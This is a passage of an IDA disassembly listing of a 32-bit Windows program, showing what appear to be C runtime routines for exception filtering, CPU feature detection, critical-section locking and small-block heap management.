loc_4166C5:                             ; DATA XREF: .rdata:stru_422FE8↓o
                mov     eax, [ebp+ms_exc.exc_ptr]
                mov     eax, [eax]
                mov     eax, [eax]
                cmp     eax, 0C0000005h
                jz      short loc_4166DD
                cmp     eax, 0C000001Dh
                jz      short loc_4166DD
                xor     eax, eax
                retn
; ---------------------------------------------------------------------------

loc_4166DD:                             ; CODE XREF: sub_4166A8+29↑j
                                        ; sub_4166A8+30↑j
                xor     eax, eax
                inc     eax
                retn
; ---------------------------------------------------------------------------

loc_4166E1:                             ; DATA XREF: .rdata:stru_422FE8↓o
                mov     esp, [ebp+ms_exc.old_esp]
                and     [ebp+var_1C], 0

loc_4166E8:                             ; CODE XREF: sub_4166A8+1B↑j
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                mov     eax, [ebp+var_1C]
                call    __SEH_epilog4
                retn
sub_4166A8      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4166F8      proc near               ; CODE XREF: sub_41675A↓p

var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 18h
                xor     eax, eax
                push    ebx
                mov     [ebp+var_4], eax
                mov     [ebp+var_C], eax
                mov     [ebp+var_8], eax
                push    ebx
                pushf
                pop     eax
                mov     ecx, eax
                xor     eax, 200000h
                push    eax
                popf
                pushf
                pop     edx
                sub     edx, ecx
                jz      short loc_41673D
                push    ecx
                popf
                xor     eax, eax
                cpuid
                mov     [ebp+var_C], eax
                mov     [ebp+var_18], ebx
                mov     [ebp+var_14], edx
                mov     [ebp+var_10], ecx
                mov     eax, 1
                cpuid
                mov     [ebp+var_4], edx
                mov     [ebp+var_8], eax

loc_41673D:                             ; CODE XREF: sub_4166F8+24↑j
                pop     ebx
                test    [ebp+var_4], 4000000h
                jz      short loc_416755
                call    sub_4166A8
                test    eax, eax
                jz      short loc_416755
                xor     eax, eax
                inc     eax
                jmp     short loc_416757
; ---------------------------------------------------------------------------

loc_416755:                             ; CODE XREF: sub_4166F8+4D↑j
                                        ; sub_4166F8+56↑j
                xor     eax, eax

loc_416757:                             ; CODE XREF: sub_4166F8+5B↑j
                pop     ebx
                leave
                retn
sub_4166F8      endp


; =============== S U B R O U T I N E =======================================


sub_41675A      proc near               ; DATA XREF: .rdata:00420210↓o
                call    sub_4166F8
                mov     dword_42C9EC, eax
                xor     eax, eax
                retn
sub_41675A      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_416767      proc near               ; CODE XREF: start-FA↑p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                xor     eax, eax
                cmp     [ebp+arg_0], eax
                push    0               ; dwMaximumSize
                setz    al
                push    1000h           ; dwInitialSize
                push    eax             ; flOptions
                call    ds:HeapCreate
                mov     hHeap, eax
                test    eax, eax
                jnz     short loc_41678D
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_41678D:                             ; CODE XREF: sub_416767+22↑j
                xor     eax, eax
                inc     eax
                mov     dword_42C9E8, eax
                pop     ebp
                retn
sub_416767      endp


; =============== S U B R O U T I N E =======================================


sub_416797      proc near               ; CODE XREF: sub_4125BC+115↑p
                mov     edi, edi
                push    esi
                push    edi
                xor     esi, esi
                mov     edi, offset unk_42AEB0

loc_4167A2:                             ; CODE XREF: sub_416797+37↓j
                cmp     dword_425BDC[esi*8], 1
                jnz     short loc_4167CA
                lea     eax, lpCriticalSection[esi*8]
                mov     [eax], edi
                push    0FA0h           ; dwSpinCount
                push    dword ptr [eax] ; lpCriticalSection
                add     edi, 18h
                call    sub_419CA1
                pop     ecx
                pop     ecx
                test    eax, eax
                jz      short loc_4167D6

loc_4167CA:                             ; CODE XREF: sub_416797+13↑j
                inc     esi
                cmp     esi, 24h
                jl      short loc_4167A2
                xor     eax, eax
                inc     eax

loc_4167D3:                             ; CODE XREF: sub_416797+49↓j
                pop     edi
                pop     esi
                retn
; ---------------------------------------------------------------------------

loc_4167D6:                             ; CODE XREF: sub_416797+31↑j
                and     lpCriticalSection[esi*8], 0
                xor     eax, eax
                jmp     short loc_4167D3
sub_416797      endp


; =============== S U B R O U T I N E =======================================


sub_4167E2      proc near               ; CODE XREF: sub_412268:loc_4122A0↑j
                mov     edi, edi
                push    ebx
                mov     ebx, ds:DeleteCriticalSection
                push    esi
                mov     esi, offset lpCriticalSection
                push    edi

loc_4167F2:                             ; CODE XREF: sub_4167E2+32↓j
                mov     edi, [esi]
                test    edi, edi
                jz      short loc_41680B
                cmp     dword ptr [esi+4], 1
                jz      short loc_41680B
                push    edi             ; lpCriticalSection
                call    ebx ; DeleteCriticalSection
                push    edi             ; lpMem
                call    sub_40FD55
                and     dword ptr [esi], 0
                pop     ecx

loc_41680B:                             ; CODE XREF: sub_4167E2+14↑j
                                        ; sub_4167E2+1A↑j
                add     esi, 8
                cmp     esi, offset dword_425CF8
                jl      short loc_4167F2
                mov     esi, offset lpCriticalSection
                pop     edi

loc_41681C:                             ; CODE XREF: sub_4167E2+52↓j
                mov     eax, [esi]
                test    eax, eax
                jz      short loc_41682B
                cmp     dword ptr [esi+4], 1
                jnz     short loc_41682B
                push    eax             ; lpCriticalSection
                call    ebx ; DeleteCriticalSection

loc_41682B:                             ; CODE XREF: sub_4167E2+3E↑j
                                        ; sub_4167E2+44↑j
                add     esi, 8
                cmp     esi, offset dword_425CF8
                jl      short loc_41681C
                pop     esi
                pop     ebx
                retn
sub_4167E2      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_416839      proc near               ; CODE XREF: sub_40FD55+58↑p
                                        ; sub_40FDE3+48↑p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                push    lpCriticalSection[eax*8] ; lpCriticalSection
                call    ds:LeaveCriticalSection
                pop     ebp
                retn
sub_416839      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_416850      proc near               ; CODE XREF: sub_413A18+57↑p
                                        ; sub_4163A4+17↑p ...

var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
arg_0           = dword ptr  8

                push    0Ch
                push    offset stru_423008
                call    __SEH_prolog4
                xor     edi, edi
                inc     edi
                mov     [ebp+var_1C], edi
                xor     ebx, ebx
                cmp     hHeap, ebx
                jnz     short loc_416884
                call    sub_4175B5
                push    1Eh
                call    sub_41740A
                push    0FFh            ; uExitCode
                call    sub_412DB9
; ---------------------------------------------------------------------------
                db  59h ; Y
                db  59h ; Y
; ---------------------------------------------------------------------------

loc_416884:                             ; CODE XREF: sub_416850+1A↑j
                mov     esi, [ebp+arg_0]
                lea     esi, lpCriticalSection[esi*8]
                cmp     [esi], ebx
                jz      short loc_416896
                mov     eax, edi
                jmp     short loc_416904
; ---------------------------------------------------------------------------

loc_416896:                             ; CODE XREF: sub_416850+40↑j
                push    18h
                call    sub_412BB3
                pop     ecx
                mov     edi, eax
                cmp     edi, ebx
                jnz     short loc_4168B3
                call    sub_41090E
                mov     dword ptr [eax], 0Ch
                xor     eax, eax
                jmp     short loc_416904
; ---------------------------------------------------------------------------

loc_4168B3:                             ; CODE XREF: sub_416850+52↑j
                push    0Ah
                call    sub_416913
                pop     ecx
                mov     [ebp+ms_exc.registration.TryLevel], ebx
                cmp     [esi], ebx
                jnz     short loc_4168EE
                push    0FA0h           ; dwSpinCount
                push    edi             ; lpCriticalSection
                call    sub_419CA1
                pop     ecx
                pop     ecx
                test    eax, eax
                jnz     short loc_4168EA
                push    edi             ; lpMem
                call    sub_40FD55
                pop     ecx
                call    sub_41090E
                mov     dword ptr [eax], 0Ch
                mov     [ebp+var_1C], ebx
                jmp     short loc_4168F5
; ---------------------------------------------------------------------------

loc_4168EA:                             ; CODE XREF: sub_416850+81↑j
                mov     [esi], edi
                jmp     short loc_4168F5
; ---------------------------------------------------------------------------

loc_4168EE:                             ; CODE XREF: sub_416850+70↑j
                push    edi             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_4168F5:                             ; CODE XREF: sub_416850+98↑j
                                        ; sub_416850+9C↑j
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_41690A
; ---------------------------------------------------------------------------

loc_416901:                             ; CODE XREF: sub_416850+C2↓j
                mov     eax, [ebp+var_1C]

loc_416904:                             ; CODE XREF: sub_416850+44↑j
                                        ; sub_416850+61↑j
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_41690A:                             ; CODE XREF: sub_416850+AC↑j
                                        ; DATA XREF: .rdata:stru_423008↓o
                push    0Ah
                call    sub_416839
                pop     ecx
                retn
sub_416850      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_416913      proc near               ; CODE XREF: sub_40FD55+1E↑p
                                        ; sub_40FDE3+1D↑p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                push    esi
                lea     esi, lpCriticalSection[eax*8]
                cmp     dword ptr [esi], 0
                jnz     short loc_41693B
                push    eax
                call    sub_416850
                pop     ecx
                test    eax, eax
                jnz     short loc_41693B
                push    11h
                call    sub_412D65
                pop     ecx

loc_41693B:                             ; CODE XREF: sub_416913+13↑j
                                        ; sub_416913+1E↑j
                push    dword ptr [esi] ; lpCriticalSection
                call    ds:EnterCriticalSection
                pop     esi
                pop     ebp
                retn
sub_416913      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_416946      proc near               ; CODE XREF: sub_40FD55+29↑p
                                        ; sub_40FEFC+5B↑p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     ecx, dword_42C9D0
                mov     eax, lpMem
                imul    ecx, 14h
                add     ecx, eax
                jmp     short loc_41696E
; ---------------------------------------------------------------------------

loc_41695D:                             ; CODE XREF: sub_416946+2A↓j
                mov     edx, [ebp+arg_0]
                sub     edx, [eax+0Ch]
                cmp     edx, 100000h
                jb      short loc_416974
                add     eax, 14h

loc_41696E:                             ; CODE XREF: sub_416946+15↑j
                cmp     eax, ecx
                jb      short loc_41695D
                xor     eax, eax

loc_416974:                             ; CODE XREF: sub_416946+23↑j
                pop     ebp
                retn
sub_416946      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_416976      proc near               ; CODE XREF: sub_40FD55+38↑p
                                        ; sub_40FEFC+B5↑p ...

var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 10h
                mov     ecx, [ebp+arg_0]
                mov     eax, [ecx+10h]
                push    esi
                mov     esi, [ebp+arg_4]
                push    edi
                mov     edi, esi
                sub     edi, [ecx+0Ch]
                add     esi, 0FFFFFFFCh
                shr     edi, 0Fh
                mov     ecx, edi
                imul    ecx, 204h
                lea     ecx, [ecx+eax+144h]
                mov     [ebp+var_10], ecx
                mov     ecx, [esi]
                dec     ecx
                mov     [ebp+var_4], ecx
                test    cl, 1
                jnz     loc_416C88
                push    ebx
                lea     ebx, [ecx+esi]
                mov     edx, [ebx]
                mov     [ebp+var_C], edx
                mov     edx, [esi-4]
                mov     [ebp+var_8], edx
                mov     edx, [ebp+var_C]
                mov     [ebp+arg_4], ebx
                test    dl, 1
                jnz     short loc_416A43
                sar     edx, 4
                dec     edx
                cmp     edx, 3Fh
                jbe     short loc_4169DB
                push    3Fh
                pop     edx

loc_4169DB:                             ; CODE XREF: sub_416976+60↑j
                mov     ecx, [ebx+4]
                cmp     ecx, [ebx+8]
                jnz     short loc_416A25
                mov     ebx, 80000000h
                cmp     edx, 20h
                jnb     short loc_416A06
                mov     ecx, edx
                shr     ebx, cl
                lea     ecx, [edx+eax+4]
                not     ebx
                and     [eax+edi*4+44h], ebx
                dec     byte ptr [ecx]
                jnz     short loc_416A22
                mov     ecx, [ebp+arg_0]
                and     [ecx], ebx
                jmp     short loc_416A22
; ---------------------------------------------------------------------------

loc_416A06:                             ; CODE XREF: sub_416976+75↑j
                lea     ecx, [edx-20h]
                shr     ebx, cl
                lea     ecx, [edx+eax+4]
                not     ebx
                and     [eax+edi*4+0C4h], ebx
                dec     byte ptr [ecx]
                jnz     short loc_416A22
                mov     ecx, [ebp+arg_0]
                and     [ecx+4], ebx

loc_416A22:                             ; CODE XREF: sub_416976+87↑j
                                        ; sub_416976+8E↑j ...
                mov     ebx, [ebp+arg_4]

loc_416A25:                             ; CODE XREF: sub_416976+6B↑j
                mov     edx, [ebx+8]
                mov     ebx, [ebx+4]
                mov     ecx, [ebp+var_4]
                add     ecx, [ebp+var_C]
                mov     [edx+4], ebx
                mov     edx, [ebp+arg_4]
                mov     ebx, [edx+4]
                mov     edx, [edx+8]
                mov     [ebx+8], edx
                mov     [ebp+var_4], ecx

loc_416A43:                             ; CODE XREF: sub_416976+57↑j
                mov     edx, ecx
                sar     edx, 4
                dec     edx
                cmp     edx, 3Fh
                jbe     short loc_416A51
                push    3Fh
                pop     edx

loc_416A51:                             ; CODE XREF: sub_416976+D6↑j
                mov     ebx, [ebp+var_8]
                and     ebx, 1
                mov     [ebp+var_C], ebx
                jnz     loc_416AEF
                sub     esi, [ebp+var_8]
                mov     ebx, [ebp+var_8]
                sar     ebx, 4
                push    3Fh
                mov     [ebp+arg_4], esi
                dec     ebx
                pop     esi
                cmp     ebx, esi
                jbe     short loc_416A76
                mov     ebx, esi

loc_416A76:                             ; CODE XREF: sub_416976+FC↑j
                add     ecx, [ebp+var_8]
                mov     edx, ecx
                sar     edx, 4
                dec     edx
                mov     [ebp+var_4], ecx
                cmp     edx, esi
                jbe     short loc_416A88
                mov     edx, esi

loc_416A88:                             ; CODE XREF: sub_416976+10E↑j
                cmp     ebx, edx
                jz      short loc_416AEA
                mov     ecx, [ebp+arg_4]
                mov     esi, [ecx+4]
                cmp     esi, [ecx+8]
                jnz     short loc_416AD2
                mov     esi, 80000000h
                cmp     ebx, 20h
                jnb     short loc_416AB8
                mov     ecx, ebx
                shr     esi, cl
                not     esi
                and     [eax+edi*4+44h], esi
                dec     byte ptr [ebx+eax+4]
                jnz     short loc_416AD2
                mov     ecx, [ebp+arg_0]
                and     [ecx], esi
                jmp     short loc_416AD2
; ---------------------------------------------------------------------------

loc_416AB8:                             ; CODE XREF: sub_416976+129↑j
                lea     ecx, [ebx-20h]
                shr     esi, cl
                not     esi
                and     [eax+edi*4+0C4h], esi
                dec     byte ptr [ebx+eax+4]
                jnz     short loc_416AD2
                mov     ecx, [ebp+arg_0]
                and     [ecx+4], esi

loc_416AD2:                             ; CODE XREF: sub_416976+11F↑j
                                        ; sub_416976+139↑j ...
                mov     ecx, [ebp+arg_4]
                mov     esi, [ecx+8]
                mov     ecx, [ecx+4]
                mov     [esi+4], ecx
                mov     ecx, [ebp+arg_4]
                mov     esi, [ecx+4]
                mov     ecx, [ecx+8]
                mov     [esi+8], ecx

loc_416AEA:                             ; CODE XREF: sub_416976+114↑j
                mov     esi, [ebp+arg_4]
                jmp     short loc_416AF2
; ---------------------------------------------------------------------------

loc_416AEF:                             ; CODE XREF: sub_416976+E4↑j
                mov     ebx, [ebp+arg_0]

loc_416AF2:                             ; CODE XREF: sub_416976+177↑j
                cmp     [ebp+var_C], 0
                jnz     short loc_416B00
                cmp     ebx, edx
                jz      loc_416B80

loc_416B00:                             ; CODE XREF: sub_416976+180↑j
                mov     ecx, [ebp+var_10]
                lea     ecx, [ecx+edx*8]
                mov     ebx, [ecx+4]
                mov     [esi+8], ecx
                mov     [esi+4], ebx
                mov     [ecx+4], esi
                mov     ecx, [esi+4]
                mov     [ecx+8], esi
                mov     ecx, [esi+4]
                cmp     ecx, [esi+8]
                jnz     short loc_416B80
                mov     cl, [edx+eax+4]
                mov     byte ptr [ebp+arg_4+3], cl
                inc     cl
                mov     [edx+eax+4], cl
                cmp     edx, 20h
                jnb     short loc_416B57
                cmp     byte ptr [ebp+arg_4+3], 0
                jnz     short loc_416B46
                mov     ecx, edx
                mov     ebx, 80000000h
                shr     ebx, cl
                mov     ecx, [ebp+arg_0]
                or      [ecx], ebx

loc_416B46:                             ; CODE XREF: sub_416976+1C0↑j
                mov     ebx, 80000000h
                mov     ecx, edx
                shr     ebx, cl
                lea     eax, [eax+edi*4+44h]
                or      [eax], ebx
                jmp     short loc_416B80
; ---------------------------------------------------------------------------

loc_416B57:                             ; CODE XREF: sub_416976+1BA↑j
                cmp     byte ptr [ebp+arg_4+3], 0
                jnz     short loc_416B6D
                lea     ecx, [edx-20h]
                mov     ebx, 80000000h
                shr     ebx, cl
                mov     ecx, [ebp+arg_0]
                or      [ecx+4], ebx

loc_416B6D:                             ; CODE XREF: sub_416976+1E5↑j
                lea     ecx, [edx-20h]
                mov     edx, 80000000h
                shr     edx, cl
                lea     eax, [eax+edi*4+0C4h]
                or      [eax], edx

loc_416B80:                             ; CODE XREF: sub_416976+184↑j
                                        ; sub_416976+1A8↑j ...
                mov     eax, [ebp+var_4]
                mov     [esi], eax
                mov     [eax+esi-4], eax
                mov     eax, [ebp+var_10]
                dec     dword ptr [eax]
                jnz     loc_416C87
                mov     eax, dword_42B000
                test    eax, eax
                jz      loc_416C79
                mov     ecx, dword_42C9E4
                mov     esi, ds:VirtualFree
                push    4000h           ; dwFreeType
                shl     ecx, 0Fh
                add     ecx, [eax+0Ch]
                mov     ebx, 8000h
                push    ebx             ; dwSize
                push    ecx             ; lpAddress
                call    esi ; VirtualFree
                mov     ecx, dword_42C9E4
                mov     eax, dword_42B000
                mov     edx, 80000000h
                shr     edx, cl
                or      [eax+8], edx
                mov     eax, dword_42B000
                mov     eax, [eax+10h]
                mov     ecx, dword_42C9E4
                and     dword ptr [eax+ecx*4+0C4h], 0
                mov     eax, dword_42B000
                mov     eax, [eax+10h]
                dec     byte ptr [eax+43h]
                mov     eax, dword_42B000
                mov     ecx, [eax+10h]
                cmp     byte ptr [ecx+43h], 0
                jnz     short loc_416C0E
                and     dword ptr [eax+4], 0FFFFFFFEh
                mov     eax, dword_42B000

loc_416C0E:                             ; CODE XREF: sub_416976+28D↑j
                cmp     dword ptr [eax+8], 0FFFFFFFFh
                jnz     short loc_416C79
                push    ebx             ; dwFreeType
                push    0               ; dwSize
                push    dword ptr [eax+0Ch] ; lpAddress
                call    esi ; VirtualFree
                mov     eax, dword_42B000
                push    dword ptr [eax+10h] ; lpMem
                push    0               ; dwFlags
                push    hHeap           ; hHeap
                call    ds:HeapFree
                mov     ecx, dword_42C9D0
                mov     eax, dword_42B000
                imul    ecx, 14h
                mov     edx, lpMem
                sub     ecx, eax
                lea     ecx, [ecx+edx-14h]
                push    ecx
                lea     ecx, [eax+14h]
                push    ecx
                push    eax
                call    sub_40F9F0
                mov     eax, [ebp+arg_0]
                add     esp, 0Ch
                dec     dword_42C9D0
                cmp     eax, dword_42B000
                jbe     short loc_416C6F
                sub     [ebp+arg_0], 14h

loc_416C6F:                             ; CODE XREF: sub_416976+2F3↑j
                mov     eax, lpMem
                mov     dword_42C9DC, eax

loc_416C79:                             ; CODE XREF: sub_416976+225↑j
                                        ; sub_416976+29C↑j
                mov     eax, [ebp+arg_0]
                mov     dword_42B000, eax
                mov     dword_42C9E4, edi

loc_416C87:                             ; CODE XREF: sub_416976+218↑j
                pop     ebx

loc_416C88:                             ; CODE XREF: sub_416976+39↑j
                pop     edi
                pop     esi
                leave
                retn
sub_416976      endp


; =============== S U B R O U T I N E =======================================


sub_416C8C      proc near               ; CODE XREF: sub_417125+C2↓p
                mov     eax, dword_42C9E0
                push    esi
                mov     esi, dword_42C9D0
                push    edi
                xor     edi, edi
                cmp     esi, eax
                jnz     short loc_416CD3
                add     eax, 10h
                imul    eax, 14h
                push    eax             ; dwBytes
                push    lpMem           ; lpMem
                push    edi             ; dwFlags
                push    hHeap           ; hHeap
                call    ds:HeapReAlloc
                cmp     eax, edi
                jnz     short loc_416CC1

loc_416CBD:                             ; CODE XREF: sub_416C8C+68↓j
                                        ; sub_416C8C+94↓j
                xor     eax, eax
                jmp     short loc_416D39
; ---------------------------------------------------------------------------

loc_416CC1:                             ; CODE XREF: sub_416C8C+2F↑j
                add     dword_42C9E0, 10h
                mov     esi, dword_42C9D0
                mov     lpMem, eax

loc_416CD3:                             ; CODE XREF: sub_416C8C+11↑j
                imul    esi, 14h
                add     esi, lpMem
                push    41C4h           ; dwBytes
                push    8               ; dwFlags
                push    hHeap           ; hHeap
                call    ds:HeapAlloc
                mov     [esi+10h], eax
                cmp     eax, edi
                jz      short loc_416CBD
                push    4               ; flProtect
                push    2000h           ; flAllocationType
                push    100000h         ; dwSize
                push    edi             ; lpAddress
                call    ds:VirtualAlloc
                mov     [esi+0Ch], eax
                cmp     eax, edi
                jnz     short loc_416D22
                push    dword ptr [esi+10h] ; lpMem
                push    edi             ; dwFlags
                push    hHeap           ; hHeap
                call    ds:HeapFree
                jmp     short loc_416CBD
; ---------------------------------------------------------------------------

loc_416D22:                             ; CODE XREF: sub_416C8C+82↑j
                or      dword ptr [esi+8], 0FFFFFFFFh
                mov     [esi], edi
                mov     [esi+4], edi
                inc     dword_42C9D0
                mov     eax, [esi+10h]
                or      dword ptr [eax], 0FFFFFFFFh
                mov     eax, esi

loc_416D39:                             ; CODE XREF: sub_416C8C+33↑j
                pop     edi
                pop     esi
                retn
sub_416C8C      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_416D3C      proc near               ; CODE XREF: sub_417125+D8↓p

var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                push    ecx
                mov     ecx, [ebp+arg_0]
                mov     eax, [ecx+8]
                push    ebx
                push    esi
                mov     esi, [ecx+10h]
                push    edi
                xor     ebx, ebx
                jmp     short loc_416D56
; ---------------------------------------------------------------------------

loc_416D53:                             ; CODE XREF: sub_416D3C+1C↓j
                add     eax, eax
                inc     ebx

loc_416D56:                             ; CODE XREF: sub_416D3C+15↑j
                test    eax, eax
                jge     short loc_416D53
                mov     eax, ebx
                imul    eax, 204h
                lea     eax, [eax+esi+144h]
                push    3Fh
                mov     [ebp+var_8], eax
                pop     edx

loc_416D6F:                             ; CODE XREF: sub_416D3C+3D↓j
                mov     [eax+8], eax
                mov     [eax+4], eax
                add     eax, 8
                dec     edx
                jnz     short loc_416D6F
                push    4               ; flProtect
                mov     edi, ebx
                push    1000h           ; flAllocationType
                shl     edi, 0Fh
                add     edi, [ecx+0Ch]
                push    8000h           ; dwSize
                push    edi             ; lpAddress
                call    ds:VirtualAlloc
                test    eax, eax
                jnz     short loc_416DA2
                or      eax, 0FFFFFFFFh
                jmp     loc_416E3F
; ---------------------------------------------------------------------------

loc_416DA2:                             ; CODE XREF: sub_416D3C+5C↑j
                lea     edx, [edi+7000h]
                mov     [ebp+var_4], edx
                cmp     edi, edx
                ja      short loc_416DF2
                mov     ecx, edx
                sub     ecx, edi
                shr     ecx, 0Ch
                lea     eax, [edi+10h]
                inc     ecx

loc_416DBA:                             ; CODE XREF: sub_416D3C+B1↓j
                or      dword ptr [eax-8], 0FFFFFFFFh
                or      dword ptr [eax+0FECh], 0FFFFFFFFh
                lea     edx, [eax+0FFCh]
                mov     [eax], edx
                lea     edx, [eax-1004h]
                mov     dword ptr [eax-4], 0FF0h
                mov     [eax+4], edx
                mov     dword ptr [eax+0FE8h], 0FF0h
                add     eax, 1000h
                dec     ecx
                jnz     short loc_416DBA
                mov     edx, [ebp+var_4]

loc_416DF2:                             ; CODE XREF: sub_416D3C+71↑j
                mov     eax, [ebp+var_8]
                add     eax, 1F8h
                lea     ecx, [edi+0Ch]
                mov     [eax+4], ecx
                mov     [ecx+8], eax
                lea     ecx, [edx+0Ch]
                mov     [eax+8], ecx
                mov     [ecx+4], eax
                and     dword ptr [esi+ebx*4+44h], 0
                xor     edi, edi
                inc     edi
                mov     [esi+ebx*4+0C4h], edi
                mov     al, [esi+43h]
                mov     cl, al
                inc     cl
                test    al, al
                mov     eax, [ebp+arg_0]
                mov     [esi+43h], cl
                jnz     short loc_416E2F
                or      [eax+4], edi

loc_416E2F:                             ; CODE XREF: sub_416D3C+EE↑j
                mov     edx, 80000000h
                mov     ecx, ebx
                shr     edx, cl
                not     edx
                and     [eax+8], edx
                mov     eax, ebx

loc_416E3F:                             ; CODE XREF: sub_416D3C+61↑j
                pop     edi
                pop     esi
                pop     ebx
                leave
                retn
sub_416D3C      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_416E44      proc near               ; CODE XREF: sub_40FEFC+77↑p

var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 0Ch
                mov     ecx, [ebp+arg_0]
                mov     eax, [ecx+10h]
                push    ebx
                push    esi
                mov     esi, [ebp+arg_8]
                push    edi
                mov     edi, [ebp+arg_4]
                mov     edx, edi
                sub     edx, [ecx+0Ch]
                add     esi, 17h
                shr     edx, 0Fh
                mov     ecx, edx
                imul    ecx, 204h
                lea     ecx, [ecx+eax+144h]
                mov     [ebp+var_C], ecx
                mov     ecx, [edi-4]
                and     esi, 0FFFFFFF0h
                dec     ecx
                cmp     esi, ecx
                lea     edi, [ecx+edi-4]
                mov     ebx, [edi]
                mov     [ebp+arg_8], ecx
                mov     [ebp+var_4], ebx
                jle     loc_416FE8
                test    bl, 1
                jnz     loc_416FE1
                add     ebx, ecx
                cmp     esi, ebx
                jg      loc_416FE1
                mov     ecx, [ebp+var_4]
                sar     ecx, 4
                dec     ecx
                mov     [ebp+var_8], ecx
                cmp     ecx, 3Fh
                jbe     short loc_416EBB
                push    3Fh
                pop     ecx
                mov     [ebp+var_8], ecx

loc_416EBB:                             ; CODE XREF: sub_416E44+6F↑j
                mov     ebx, [edi+4]
                cmp     ebx, [edi+8]
                jnz     short loc_416F06
                mov     ebx, 80000000h
                cmp     ecx, 20h
                jnb     short loc_416EE7
                shr     ebx, cl
                mov     ecx, [ebp+var_8]
                lea     ecx, [ecx+eax+4]
                not     ebx
                and     [eax+edx*4+44h], ebx
                dec     byte ptr [ecx]
                jnz     short loc_416F06
                mov     ecx, [ebp+arg_0]
                and     [ecx], ebx
                jmp     short loc_416F06
; ---------------------------------------------------------------------------

loc_416EE7:                             ; CODE XREF: sub_416E44+87↑j
                add     ecx, 0FFFFFFE0h
                shr     ebx, cl
                mov     ecx, [ebp+var_8]
                lea     ecx, [ecx+eax+4]
                not     ebx
                and     [eax+edx*4+0C4h], ebx
                dec     byte ptr [ecx]
                jnz     short loc_416F06
                mov     ecx, [ebp+arg_0]
                and     [ecx+4], ebx

loc_416F06:                             ; CODE XREF: sub_416E44+7D↑j
                                        ; sub_416E44+9A↑j ...
                mov     ecx, [edi+8]
                mov     ebx, [edi+4]
                mov     [ecx+4], ebx
                mov     ecx, [edi+4]
                mov     edi, [edi+8]
                mov     [ecx+8], edi
                mov     ecx, [ebp+arg_8]
                sub     ecx, esi
                add     [ebp+var_4], ecx
                cmp     [ebp+var_4], 0
                jle     loc_416FCF
                mov     edi, [ebp+var_4]
                mov     ecx, [ebp+arg_4]
                sar     edi, 4
                dec     edi
                lea     ecx, [ecx+esi-4]
                cmp     edi, 3Fh
                jbe     short loc_416F40
                push    3Fh
                pop     edi

loc_416F40:                             ; CODE XREF: sub_416E44+F7↑j
                mov     ebx, [ebp+var_C]
                lea     ebx, [ebx+edi*8]
                mov     [ebp+arg_8], ebx
                mov     ebx, [ebx+4]
                mov     [ecx+4], ebx
                mov     ebx, [ebp+arg_8]
                mov     [ecx+8], ebx
                mov     [ebx+4], ecx
                mov     ebx, [ecx+4]
                mov     [ebx+8], ecx
                mov     ebx, [ecx+4]
                cmp     ebx, [ecx+8]
                jnz     short loc_416FBD
                mov     cl, [edi+eax+4]
                mov     byte ptr [ebp+arg_8+3], cl
                inc     cl
                mov     [edi+eax+4], cl
                cmp     edi, 20h
                jnb     short loc_416F94
                cmp     byte ptr [ebp+arg_8+3], 0
                jnz     short loc_416F8C
                mov     ecx, edi
                mov     ebx, 80000000h
                shr     ebx, cl
                mov     ecx, [ebp+arg_0]
                or      [ecx], ebx

loc_416F8C:                             ; CODE XREF: sub_416E44+138↑j
                lea     eax, [eax+edx*4+44h]
                mov     ecx, edi
                jmp     short loc_416FB4
; ---------------------------------------------------------------------------

loc_416F94:                             ; CODE XREF: sub_416E44+132↑j
                cmp     byte ptr [ebp+arg_8+3], 0
                jnz     short loc_416FAA
                lea     ecx, [edi-20h]
                mov     ebx, 80000000h
                shr     ebx, cl
                mov     ecx, [ebp+arg_0]
                or      [ecx+4], ebx

loc_416FAA:                             ; CODE XREF: sub_416E44+154↑j
                lea     eax, [eax+edx*4+0C4h]
                lea     ecx, [edi-20h]

loc_416FB4:                             ; CODE XREF: sub_416E44+14E↑j
                mov     edx, 80000000h
                shr     edx, cl
                or      [eax], edx

loc_416FBD:                             ; CODE XREF: sub_416E44+120↑j
                mov     edx, [ebp+arg_4]
                mov     ecx, [ebp+var_4]
                lea     eax, [edx+esi-4]
                mov     [eax], ecx
                mov     [ecx+eax-4], ecx
                jmp     short loc_416FD2
; ---------------------------------------------------------------------------

loc_416FCF:                             ; CODE XREF: sub_416E44+E0↑j
                mov     edx, [ebp+arg_4]

loc_416FD2:                             ; CODE XREF: sub_416E44+189↑j
                lea     eax, [esi+1]
